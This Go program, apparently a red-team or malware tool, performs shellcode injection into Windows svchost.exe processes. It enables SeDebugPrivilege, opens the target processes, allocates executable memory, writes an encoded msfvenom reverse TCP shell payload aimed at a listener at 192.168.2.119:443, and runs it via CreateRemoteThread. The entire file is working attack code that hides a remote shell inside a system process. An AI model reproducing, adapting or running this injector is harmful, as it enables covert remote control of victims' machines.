package main

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func setSeDebugPrivilege() {
	// Get current process (the one I wanna change)
	handle, err := windows.GetCurrentProcess()
	defer windows.CloseHandle(handle)
	if err != nil {
		log.Fatal(err)
	}

	// Get the current process token
	var token windows.Token
	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES, &token)
	if err != nil {
		log.Fatal(err)
	}

	// Check the LUID
	var luid windows.LUID
	seDebugName, err := windows.UTF16FromString("SeDebugPrivilege")
	if err != nil {
		fmt.Println(err)
	}
	err = windows.LookupPrivilegeValue(nil, &seDebugName[0], &luid)
	if err != nil {
		log.Fatal(err)
	}

	// Modify the token
	var tokenPriviledges windows.Tokenprivileges
	tokenPriviledges.PrivilegeCount = 1
	tokenPriviledges.Privileges[0].Luid = luid
	tokenPriviledges.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	// Adjust token privs
	tokPrivLen := uint32(unsafe.Sizeof(tokenPriviledges))
	fmt.Printf("Length is %d\n", tokPrivLen)
	err = windows.AdjustTokenPrivileges(token, false, &tokenPriviledges, tokPrivLen, nil, nil)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Debug Priviledge granted")
}

func main() {
	var (
		target    = "svchost.exe"
		targetIDs []uint32
	)

	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.119 LPORT=443 -f c -b \x00\x0a\x0d
	targetShellcode := [510]byte{
		0xeb, 0x27, 0x5b, 0x53, 0x5f, 0xb0, 0xdb, 0xfc, 0xae, 0x75, 0xfd, 0x57, 0x59,
		0x53, 0x5e, 0x8a, 0x06, 0x30, 0x07, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc6, 0x66,
		0x81, 0x3f, 0x2b, 0x56, 0x74, 0x07, 0x80, 0x3e, 0xdb, 0x75, 0xea, 0xeb, 0xe6,
		0xff, 0xe1, 0xe8, 0xd4, 0xff, 0xff, 0xff, 0x14, 0xdb, 0xe8, 0x5c, 0x97, 0xf0,
		0xe4, 0xfc, 0xd4, 0x14, 0x14, 0x14, 0x55, 0x45, 0x55, 0x44, 0x46, 0x45, 0x42,
		0x5c, 0x25, 0xc6, 0x71, 0x5c, 0x9f, 0x46, 0x74, 0x5c, 0x9f, 0x46, 0x0c, 0x5c,
		0x9f, 0x46, 0x34, 0x5c, 0x9f, 0x66, 0x44, 0x5c, 0x1b, 0xa3, 0x5e, 0x5e, 0x59,
		0x25, 0xdd, 0x5c, 0x25, 0xd4, 0xb8, 0x28, 0x75, 0x68, 0x16, 0x38, 0x34, 0x55,
		0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5, 0xf6, 0xf9, 0x46, 0x55, 0x45, 0x5c, 0x9f,
		0x46, 0x34, 0x9f, 0x56, 0x28, 0x5c, 0x15, 0xc4, 0x9f, 0x94, 0x9c, 0x14, 0x14,
		0x14, 0x5c, 0x91, 0xd4, 0x60, 0x73, 0x5c, 0x15, 0xc4, 0x44, 0x9f, 0x5c, 0x0c,
		0x50, 0x9f, 0x54, 0x34, 0x5d, 0x15, 0xc4, 0xf7, 0x42, 0x5c, 0xeb, 0xdd, 0x55,
		0x9f, 0x20, 0x9c, 0x5c, 0x15, 0xc2, 0x59, 0x25, 0xdd, 0x5c, 0x25, 0xd4, 0xb8,
		0x55, 0xd5, 0xdd, 0x19, 0x55, 0x15, 0xd5, 0x2c, 0xf4, 0x61, 0xe5, 0x58, 0x17,
		0x58, 0x30, 0x1c, 0x51, 0x2d, 0xc5, 0x61, 0xcc, 0x4c, 0x50, 0x9f, 0x54, 0x30,
		0x5d, 0x15, 0xc4, 0x72, 0x55, 0x9f, 0x18, 0x5c, 0x50, 0x9f, 0x54, 0x08, 0x5d,
		0x15, 0xc4, 0x55, 0x9f, 0x10, 0x9c, 0x5c, 0x15, 0xc4, 0x55, 0x4c, 0x55, 0x4c,
		0x4a, 0x4d, 0x4e, 0x55, 0x4c, 0x55, 0x4d, 0x55, 0x4e, 0x5c, 0x97, 0xf8, 0x34,
		0x55, 0x46, 0xeb, 0xf4, 0x4c, 0x55, 0x4d, 0x4e, 0x5c, 0x9f, 0x06, 0xfd, 0x43,
		0xeb, 0xeb, 0xeb, 0x49, 0x5d, 0xaa, 0x63, 0x67, 0x26, 0x4b, 0x27, 0x26, 0x14,
		0x14, 0x55, 0x42, 0x5d, 0x9d, 0xf2, 0x5c, 0x95, 0xf8, 0xb4, 0x15, 0x14, 0x14,
		0x5d, 0x9d, 0xf1, 0x5d, 0xa8, 0x16, 0x14, 0x15, 0xaf, 0xd4, 0xbc, 0x16, 0x63,
		0x55, 0x40, 0x5d, 0x9d, 0xf0, 0x58, 0x9d, 0xe5, 0x55, 0xae, 0x58, 0x63, 0x32,
		0x13, 0xeb, 0xc1, 0x58, 0x9d, 0xfe, 0x7c, 0x15, 0x15, 0x14, 0x14, 0x4d, 0x55,
		0xae, 0x3d, 0x94, 0x7f, 0x14, 0xeb, 0xc1, 0x44, 0x44, 0x59, 0x25, 0xdd, 0x59,
		0x25, 0xd4, 0x5c, 0xeb, 0xd4, 0x5c, 0x9d, 0xd6, 0x5c, 0xeb, 0xd4, 0x5c, 0x9d,
		0xd5, 0x55, 0xae, 0xfe, 0x1b, 0xcb, 0xf4, 0xeb, 0xc1, 0x5c, 0x9d, 0xd3, 0x7e,
		0x04, 0x55, 0x4c, 0x58, 0x9d, 0xf6, 0x5c, 0x9d, 0xed, 0x55, 0xae, 0x8d, 0xb1,
		0x60, 0x75, 0xeb, 0xc1, 0x5c, 0x95, 0xd0, 0x54, 0x16, 0x14, 0x14, 0x5d, 0xac,
		0x77, 0x79, 0x70, 0x14, 0x14, 0x14, 0x14, 0x14, 0x55, 0x44, 0x55, 0x44, 0x5c,
		0x9d, 0xf6, 0x43, 0x43, 0x43, 0x59, 0x25, 0xd4, 0x7e, 0x19, 0x4d, 0x55, 0x44,
		0xf6, 0xe8, 0x72, 0xd3, 0x50, 0x30, 0x40, 0x15, 0x15, 0x5c, 0x99, 0x50, 0x30,
		0x0c, 0xd2, 0x14, 0x7c, 0x5c, 0x9d, 0xf2, 0x42, 0x44, 0x55, 0x44, 0x55, 0x44,
		0x55, 0x44, 0x5d, 0xeb, 0xd4, 0x55, 0x44, 0x5d, 0xeb, 0xdc, 0x59, 0x9d, 0xd5,
		0x58, 0x9d, 0xd5, 0x55, 0xae, 0x6d, 0xd8, 0x2b, 0x92, 0xeb, 0xc1, 0x5c, 0x25,
		0xc6, 0x5c, 0xeb, 0xde, 0x9f, 0x1a, 0x55, 0xae, 0x1c, 0x93, 0x09, 0x74, 0xeb,
		0xc1, 0xaf, 0xe4, 0xa1, 0xb6, 0x42, 0x55, 0xae, 0xb2, 0x81, 0xa9, 0x89, 0xeb,
		0xc1, 0x5c, 0x97, 0xd0, 0x3c, 0x28, 0x12, 0x68, 0x1e, 0x94, 0xef, 0xf4, 0x61,
		0x11, 0xaf, 0x53, 0x07, 0x66, 0x7b, 0x7e, 0x14, 0x4d, 0x55, 0x9d, 0xce, 0xeb,
		0xc1, 0x2b, 0x56}

	// Grant the process SeDebugPrivilege
	setSeDebugPrivilege()

	// Check to find the process id (PID) we are interested in
	processesSnap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	defer windows.CloseHandle(processesSnap)
	if err != nil {
		log.Fatal(err)
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	err = windows.Process32First(processesSnap, &pe32)
	if err != nil {
		log.Fatal(err)
	}
	for {
		if pe32.ProcessID > 0 {
			processName := windows.UTF16PtrToString(&pe32.ExeFile[0])
			if processName == target {
				targetIDs = append(targetIDs, pe32.ProcessID)
			}
		}
		err = windows.Process32Next(processesSnap, &pe32)
		if err != nil {
			break
		}
	}

	for _, targetID := range targetIDs {
		// Now that we have the PID of the process we want to target, we can get a handle to it
		// Since some SYSTEM processes seem not to be injectable, I iterate over all the results I find
		// until I find an injectable process
		victimProcess, err := windows.OpenProcess(
			windows.PROCESS_CREATE_THREAD|
				windows.PROCESS_VM_WRITE|
				windows.PROCESS_VM_READ|
				windows.PROCESS_VM_OPERATION,
			false, targetID)

		defer windows.CloseHandle(victimProcess)
		if err == nil {
			fmt.Printf("[+] Opened victim process %d\n", targetID)

			// Trying to allocate memory on remote process. VirtualAllocEx is not defined on the windows package
			var (
				kernel32DLL        = windows.NewLazyDLL("kernel32.dll")
				virtualAllocEx     = kernel32DLL.NewProc("VirtualAllocEx")
				writeProcessMemory = kernel32DLL.NewProc("WriteProcessMemory")
			)
			dwSize := uint32(len(targetShellcode))
			addr, _, err := virtualAllocEx.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				uintptr(dwSize),
				uintptr(windows.MEM_RESERVE|windows.MEM_COMMIT),
				uintptr(windows.PAGE_EXECUTE_READWRITE))
			if addr == 0 {
				fmt.Println("[-] virtualAllocEx returned NULL")
				log.Fatal(err)
			}

			// Trying to write the shellcode to the allocated memory
			var writtenBytes uint64 = 0
			r1, _, err := writeProcessMemory.Call(
				uintptr(victimProcess),
				uintptr(addr),
				uintptr(unsafe.Pointer(&targetShellcode[0])),
				uintptr(dwSize),
				uintptr(unsafe.Pointer(&writtenBytes)),
			)
			if r1 == 0 {
				fmt.Println("[-] writeProcessMemory failed")
				//log.Fatal(err)
			}
			fmt.Printf("[+] Written %d bytes to remote process\n", writtenBytes)

			// Create remote thread and launch our shellcode. CreateRemoteThread is not defined by the windows package
			createRemoteThread := kernel32DLL.NewProc("CreateRemoteThread")
			r1, _, err = createRemoteThread.Call(
				uintptr(victimProcess),
				uintptr(unsafe.Pointer(nil)),
				0,
				uintptr(addr), // Unilke DLL injection, we start directly from the shellcode and we don't pass parameters
				0,
				0,
				uintptr(unsafe.Pointer(nil)))
			if r1 == 0 {
				fmt.Println("[-] Failed to launch remote thread")
				log.Fatal(err)
			}
			handle := windows.Handle(r1)
			windows.WaitForSingleObject(handle, windows.INFINITE)
			break
		} else {
			fmt.Printf("[-] Failed to open victim process %d, trying another one\n", targetID)
		}
	}
}
